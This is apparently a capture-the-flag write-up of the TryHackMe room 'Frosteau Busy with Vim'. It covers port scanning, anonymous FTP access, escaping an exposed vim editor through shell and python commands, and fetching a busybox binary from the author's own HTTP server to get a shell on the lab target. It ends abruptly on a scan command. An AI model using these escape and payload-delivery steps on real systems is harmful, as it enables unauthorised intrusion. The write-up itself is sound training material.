<h1 align="center">Frosteau Busy with Vim</h1>
<p align="center">2025, August 24<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>474</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em></em><br>
<img width="80px" src=""><br>
Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/bypass">here </a>.<br>
<img width="1200px" src="></p>

<br>
<h2>Task 1 . </h2>


<p><em>Answer the questions below</em></p>

<br>
<br>
<h3>Nmap</h3>

```bash
:~/FrosteauBusyWithVim# nmap -p- -T4 10.201.54.165 -vvv
...
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
8065/tcp open  unknown syn-ack ttl 63
8075/tcp open  unknown syn-ack ttl 63
8085/tcp open  unknown syn-ack ttl 63
8095/tcp open  unknown syn-ack ttl 63
```

```bash
:~/FrosteauBusyWithVim# nmap -A -p 22,80,8065,8075,8095 -T4 10.201.54.165 -vvv
...
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 64 WebSockify Python/3.8.10
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 405 Method Not Allowed
|     Server: WebSockify Python/3.8.10
|     Date: Sun, 24 Aug 2025 18:16:44 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 472
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 405</p>
|     <p>Message: Method Not Allowed.</p>
|     <p>Error code explanation: 405 - Specified method is invalid for this resource.</p>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 501 Unsupported method ('OPTIONS')
|     Server: WebSockify Python/3.8.10
|     Date: Sun, 24 Aug 2025 18:16:44 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 500
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 501</p>
|     <p>Message: Unsupported method ('OPTIONS').</p>
|     <p>Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.</p>
|     </body>
|_    </html>
|_http-server-header: WebSockify Python/3.8.10
|_http-title: Error response
8065/tcp open  telnet  syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines, NULL, RPCCheck, SIPOptions: 
|     Ubuntu 22.04.3 LTS
|   GetRequest: 
|     Ubuntu 22.04.3 LTS
|     HTTP/1.0
|   Help: 
|     Ubuntu 22.04.3 LTS
|     HELP
|   NCP: 
|     Ubuntu 22.04.3 LTS
|     DmdT^@^@^@
|     ^@^@^@^A^@^@^@^@
|   tn3270: 
|     Ubuntu 22.04.3 LTS
|_    ^@IBM-3279-4-E
8075/tcp open  ftp     syn-ack ttl 63 BusyBox ftpd (D-Link DCS-932L IP-Cam camera)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 172.18.0.2 is not the same as 10.201.54.165
|_ftp-bounce: bounce working!
| ftp-syst: 
|   STAT: 
| Server status:
|  TYPE: BINARY
|_Ok
8095/tcp open  telnet  syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines: 
|     Ubuntu 22.04.3 LTS
|     [?2004h
|     [1;24r
|     [?7h
|     [?25l
|     [22;24H
|     [0;7m
|     Directory '.' is not writable ]
|     [0;7m
|     nano 6.2 New Buffer 
|     [1;79H
|     [22B
|     [0;7m
|     (B^G
|     Help
|     [0;7m
|     (B^O
|     Write Out 
|     [0;7m
|     (B^W
|     Where Is 
|     [0;7m
|     (B^K
|     [0;7m
|     (B^T
|     Execute 
|     [0;7m
|     (B^C
|     Location
|     [0;7m
|     (B^X
|     Exit
|     [0;7m
|     (B^R
|     Read File 
|     [0;7m
|     (B^\x1b[m
|     Replace 
|     [0;7m
|     (B^U
|     Paste 
|     [0;7m
|     (B^J
|     Justify 
|     [0;7m
|     (B^/
|     Line
|     [22A
|     [?25h
|     [?25l
|     [1;49H
|     [0;7m
|     [29C
|     [?25h
|   NULL: 
|     Ubuntu 22.04.3 LTS
|     [?2004h
|     [1;24r
|     [?7h
|     [?25l
|     [22;24H
|     [0;7m
|     Directory '.' is not writable ]
|     [0;7m
|     nano 6.2 New Buffer 
|     [1;79H
|     [22B
|     [0;7m
|     (B^G
|     Help
|     [0;7m
|     (B^O
|     Write Out 
|     [0;7m
|     (B^W
|     Where Is 
|     [0;7m
|     (B^K
|     [0;7m
|     (B^T
|     Execute 
|     [0;7m
|     (B^C
|     Location
|     [0;7m
|     (B^X
|     Exit
|     [0;7m
|     (B^R
|     Read File 
|     [0;7m
|     (B^\x1b[m
|     Replace 
|     [0;7m
|     (B^U
|     Paste 
|     [0;7m
|     (B^J
|     Justify 
|     [0;7m
|     (B^/
|     Line
|     [22A
|_    [?25h
...
```

<br>
<br>

<img width="997" height="204" alt="image" src="https://github.com/user-attachments/assets/feeb9c85-a532-410f-9a30-74d40c8f4ff4" />

<br>
<br>

<img width="991" height="309" alt="image" src="https://github.com/user-attachments/assets/64079947-0008-4efe-b118-71264fa4e535" />

<br>
<br>

<img width="998" height="197" alt="image" src="https://github.com/user-attachments/assets/8ea70a29-3d1a-4f99-8928-d0ddcb472f63" />

<br>
<br>

<img width="994" height="289" alt="image" src="https://github.com/user-attachments/assets/b837d701-5a38-4c0d-93f9-2f610dc764a9" />


<br>
<br>
<h3>Web port 80</h3>

<img width="1135" height="268" alt="image" src="https://github.com/user-attachments/assets/311cfba0-9a37-44f2-9793-20d24e061068" />

<br>
<br>
<h3>port 8075</h3>

```bash
:~/FrosteauBusyWithVim# telnet 10.201.54.165 8075
Connected to 10.201.54.165.
220 Operation successful
Name (10.201.54.165:root): anonymous
230 Operation successful
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 Operation successful
150 Directory listing
total 8132
-rw-r--r--    1 0        0             3010 Nov  5  2023 FROST-2247-SP.txt
-rw-r--r--    1 0        0             3211 Nov  5  2023 YETI-1125-SP.txt
-rw-r--r--    1 0        0               24 Nov  5  2023 flag-1-of-4.txt
-rw-r--r--    1 0        0               12 Nov  5  2023 flag-2-of-4.sh
-rw-r--r--    1 0        0          2127524 Nov  5  2023 frostling_base.png
-rw-r--r--    1 0        0          2305908 Nov  5  2023 frostling_five.png
-rw-r--r--    1 0        0          1589463 Nov  5  2023 yeti_footage.png
-rw-r--r--    1 0        0          2277409 Nov  5  2023 yeti_mugshot.png
226 Operation successful
ftp> get FROST-2247-SP.txt
local: FROST-2247-SP.txt remote: FROST-2247-SP.txt
200 Operation successful
150 Opening BINARY connection for FROST-2247-SP.txt (3010 bytes)
226 Operation successful
3010 bytes received in 0.00 secs (7.1944 MB/s)
ftp> get YETI-1125-SP.txt
...
ftp> get flag-1-of-4.txt
...
ftp> get flag-2-of-4.sh
...
ftp> get frostling_base.png
...
ftp> get frostling_five.png
...
ftp> get yeti_footage.png
...
ftp> get yeti_mugshot.png
...
ftp> bye
221 Operation successful
```

<br>
<br>

<img width="912" height="848" alt="image" src="https://github.com/user-attachments/assets/6a838c4d-df48-4efe-8df4-bf398c49e97b" />

<br>
<br>
<h4>Types</h4>

<img width="1016" height="426" alt="image" src="https://github.com/user-attachments/assets/765d9c70-b370-43da-8c78-391024bbc0c0" />

<br>
<br>
<h4>Contents</h4>

```bash
$ cat flag-1-of-4.txt
THM{Let.the.game.begin}
```

<br>

<p>1.1. Flag 1<br>
<code>THM{Let.the.game.begin}</code><br>

<br>
<br>

<img width="1013" height="106" alt="image" src="https://github.com/user-attachments/assets/bd5034e2-aa8e-4613-bc86-689906f0b2e8" />

<br>
<br>

```bash
:~/FrosteauBusyWithVim# cat flag-2-of-4.sh
echo $FLAG2
```

```bash
:~/FrosteauBusyWithVim# cat YETI-1125-SP.txt
Identification Number: YETI-1125-SP

Alias(es): Bandit Yeti, Snowbyte Hacker, Frosty Fingers

Real Name: Unknown
...
Wanted Status: In Custody

Contact Information:

    Lead Investigator: Skidy McElf
    South Pole HQ Security Division
    Encrypted Comms Channel: SPHQ-SECURE-ELFNET

This profile should be kept confidential and only shared among authorized personnel involved in the investigation and prosecution of the Bandit Yeti. Any further sightings or incidents should be reported immediately to the contact listed above.
```

```bash
:~/FrosteauBusyWithVim# cat FROST-2247-SP.txt
Identification Numbers: FROST-2247-SP to FROST-2251-SP

Aliases: The Frostling Five

Real Names: Unidentified
...
Wanted Status: Wanted; Active Search in Progress

Contact Information:

    Lead Investigator: Skidy McElf
    South Pole HQ Security Division
    Encrypted Comms Channel: SPHQ-SECURE-ELFNET

All personnel involved in the apprehension of the Frostling Five are to exercise maximum caution and are advised to use non-lethal containment methods. This document is to be disseminated only among those with Level 5 Clearance or higher within the South Pole HQ Security Division. Any leads on the Frostling Five should be directed immediately to the contact listed above.
```

<br>
<br>

<img width="588" height="682" alt="image" src="https://github.com/user-attachments/assets/dc603d08-eb9e-422a-88ab-d13c01d21a79" />

<br>
<br>

<img width="590" height="680" alt="image" src="https://github.com/user-attachments/assets/badbbcf4-60a4-40c3-8c28-67c4e119909f" />

<br>
<br>

<img width="587" height="683" alt="image" src="https://github.com/user-attachments/assets/1c6779b5-bba7-4da9-b52a-2a8396d25d41" />

<br>
<br>

<img width="586" height="681" alt="image" src="https://github.com/user-attachments/assets/e25f5244-8221-4a0e-8691-51f5b27e9d2e" />

<br>
<br>
<h3>port 8085</h3>

```bash
$ telnet 10.201.54.165 8085
Trying 10.201.54.165...
Connected to 10.201.54.165.
Escape character is '^]'.
```

```bash
~
~
~
:echo $FLAG2
```

```bash
~
~
~
THM{Seems.like.we.are.getting.busy}
```
<br>

<p>1.2. Flag 2<br>
<code>THM{Seems.like.we.are.getting.busy}</code><br>

<br>
<br>

```bash
~
~
~
:Ex
```

<p>[ENTER]</p>

<br>
<br>

<img width="1123" height="771" alt="image" src="https://github.com/user-attachments/assets/485a59c7-5254-48fe-8e4b-bf93df2ec898" />

<br>
<br>

<img width="1128" height="771" alt="image" src="https://github.com/user-attachments/assets/f8ed75e6-4a65-45d6-bca6-9a85a5c81780" />

<br>
<br>

<img width="1122" height="341" alt="image" src="https://github.com/user-attachments/assets/62400373-cf81-4f06-8732-f4e54898dd75" />

<br>
<br>

<img width="1125" height="258" alt="image" src="https://github.com/user-attachments/assets/936ab6a3-7442-43eb-a767-43c5e9dbe06f" />

<br>
<br>

<img width="1121" height="294" alt="image" src="https://github.com/user-attachments/assets/fd61f857-e4a6-4947-82ff-3c46b3caaeb7" />




<br>
<br>

<img width="1106" height="750" alt="image" src="https://github.com/user-attachments/assets/152705d3-5ed6-4a8b-bad2-be6d6bc28716" />

<br>
<br>


```bash
~
~
:set shell=/tmp/sh|:shell
```

```bash
~
~
Cannot execute shell /tmp/sh
```

<br>

```bash
~
~
:python3 import os; print(os.listdir('/home'))
```

```bash
['ubuntu']
```

<br>
<br>

<img width="1005" height="37" alt="image" src="https://github.com/user-attachments/assets/d5f1d799-780f-431f-a2a0-a098da16f273" />

<br>
<br>

```bash
~
~
:python3 import os; print(os.listdir('/home/ubuntu'))
```

```bash
['.local']
```

<br>

```bash
~
~
:python3 import getpass; print(getpass.getuser())
```

```bash
ubuntu
```

<br>

```bash
~
~
:python3 import os; print(os.getenv('SHELL'))
```

```bash
/tmp/sh
```

<br>

```bash
~
~
:python3 import os; print(os.listdir('/usr'))
```

```bash
['libexec', 'lib', 'sbin', 'src', 'bin', 'include', 'share', 'lib64', 'libx32', 'games', 'local', 'lib32', 'frosty', 'special']
```

<br>
<br>

<img width="1124" height="67" alt="image" src="https://github.com/user-attachments/assets/dd4a984e-74c3-4975-b20b-dcfa4b86150f" />

<br>
<br>

```bash
~
~
:python3 import os; print(os.listdir('/usr/special'))
```

```bash
['protector.sh']
```

<br>
<br>

<img width="1121" height="100" alt="image" src="https://github.com/user-attachments/assets/72dfb9b5-f32b-4a87-b975-4c987b038e05" />

<br>
<br>

```bash
~
~
:python3 import os; print(os.listdir('/usr/frosty'))
```

```bash
['sh']
```

<br>
<br>

<img width="1125" height="154" alt="image" src="https://github.com/user-attachments/assets/80f694dd-5c4f-4d71-9d5b-340fff41b33a" />


<h4>Busybox</h4>

<p>

- search for <code>Busybox static download</code><br>
- navigate to <code>https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/<code><br>
- click <code>1.35.0-x86_64-linux-musl</code><br>
- click <code>busybox</code>
- <code>Save</code></p>

<br>

<img width="1128" height="601" alt="image" src="https://github.com/user-attachments/assets/6048c7b8-e6f6-4295-b788-d808da56cdee" />

<br>
<br>
<h4>HTTP server</h4>

```bash
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

<br>
<br>

<img width="1125" height="216" alt="image" src="https://github.com/user-attachments/assets/e33a8a5f-514a-44b2-8e5f-7a07b1f12d7f" />


<br>
<br>
<h4>HTTP server</h4>

```bash
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.201.54.165 - - [24/Aug/2025 20:21:02] "GET /busybox HTTP/1.1" 200 -
```

<br>
<h3></h3>

<br>
<br>

<img width="1119" height="772" alt="image" src="https://github.com/user-attachments/assets/5f0032e1-d7e7-4bcc-9de1-4a533cba52f7" />

<br>
<br>


```bash
~
~
:set shell=/usr/frosty/sh|:shell
[No write since last change]


BusyBox v1.30.1 (Ubuntu 1:1.30.1-4ubuntu6.5) built-in shell (ash)
Enter 'help' for a list of built-in commands.

$ whoami
/usr/frosty/sh: whoami: not found
$ ls -la
-rwxr-xr-x    1         0 .dockerenv
lrwxrwxrwx    1         9 lib32 -> usr/lib32
lrwxrwxrwx    1        10 libx32 -> usr/libx32
lrwxrwxrwx    1         9 lib64 -> usr/lib64
drwxr-xr-x    2      4096 media
drwxr-xr-x    2      4096 mnt
drwxr-xr-x    1      4096 ..
drwxr-xr-x    1      4096 var
lrwxrwxrwx    1         7 bin -> usr/bin
drwxr-xr-x    1      4096 etc
drwxr-xr-x    1      4096 home
drwxr-xr-x    1      4096 usr
drwxr-xr-x    1      4096 .
drwx------    1      4096 root
lrwxrwxrwx    1         8 sbin -> usr/sbin
drwxr-xr-x   11      3120 dev
drwxr-xr-x    2      4096 opt
drwxrwxrwt    1      4096 tmp
drwxr-xr-x    2      4096 boot
drwxr-xr-x    1      4096 run
drwxr-xr-x    2      4096 srv
lrwxrwxrwx    1         7 lib -> usr/lib
dr-xr-xr-x  247         0 proc
dr-xr-xr-x   13         0 sys
$ cd /home/ubuntu
$ ls -la
drwxrwxr-x    3      4096 .local
drwxr-xr-x    1      4096 ..
drwxr-xr-x    1      4096 .
$ cd .local/
$ ls -la
drwx------    3      4096 share
drwxr-xr-x    1      4096 ..
drwxrwxr-x    3      4096 .
$ cd share/
$ ls -la
drwxrwxr-x    3      4096 ..
drwx------    3      4096 .
drwx------    2      4096 nano
$ pwd
/home/ubuntu/.local/share
$ echo $FLAG2
THM{Seems.like.we.are.getting.busy}
```

<br>

<p>1.2. Flag 2<br>
<code>THM{Seems.like.we.are.getting.busy}</code><br>

<br>
<br>

<p>

- .dockerenv</p>

<br>

```bash
$ cd /
$ ls -la
-rwxr-xr-x    1         0 .dockerenv
lrwxrwxrwx    1         9 lib32 -> usr/lib32
lrwxrwxrwx    1        10 libx32 -> usr/libx32
lrwxrwxrwx    1         9 lib64 -> usr/lib64
drwxr-xr-x    2      4096 media
drwxr-xr-x    2      4096 mnt
drwxr-xr-x    1      4096 ..
drwxr-xr-x    1      4096 var
lrwxrwxrwx    1         7 bin -> usr/bin
drwxr-xr-x    1      4096 etc
drwxr-xr-x    1      4096 home
drwxr-xr-x    1      4096 usr
drwxr-xr-x    1      4096 .
drwx------    1      4096 root
lrwxrwxrwx    1         8 sbin -> usr/sbin
drwxr-xr-x   11      3120 dev
drwxr-xr-x    2      4096 opt
drwxrwxrwt    1      4096 tmp
drwxr-xr-x    2      4096 boot
drwxr-xr-x    1      4096 run
drwxr-xr-x    2      4096 srv
lrwxrwxrwx    1         7 lib -> usr/lib
dr-xr-xr-x  247         0 proc
dr-xr-xr-x   13         0 sys
$ cd /root
/usr/frosty/sh: cd: can't cd to /root: Permission denied
$ 
```

<br>
<br>
<h3>port 8065</h3>

```bash
:~/FrosteauBusyWithVim# telnet 10.201.54.165 8065
Trying 10.201.54.165...
Connected to 10.201.54.165.
Escape character is '^]'.

Ubuntu 22.04.3 LTS


BusyBox v1.30.1 (Ubuntu 1:1.30.1-4ubuntu6.5) built-in shell (ash)
Enter 'help' for a list of built-in commands.

# 
```

<br>
<br>

```bash
:~/FrosteauBusyWithVim# ftp 10.201.54.165 8075
Connected to 10.201.54.165.
220 Operation successful
Name (10.201.54.165:root): anonymous
230 Operation successful
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> mkdir tmp
257 Operation successful
ftp> cd tmp
250 Operation successful
ftp> put flag-2-of-4.sh
local: flag-2-of-4.sh remote: flag-2-of-4.sh
200 Operation successful
150 Ok to send data
226 Operation successful
12 bytes sent in 0.00 secs (509.5109 kB/s)
ftp> 
```




<img width="1120" height="684" alt="image" src="https://github.com/user-attachments/assets/b18b931a-debf-42a8-b404-bfb1c799eaf6" />


```bash
$ nmap -A -p 22,80,8065,8075,8095,24641,29972 -T4 10.10.123.117 -vvv
```
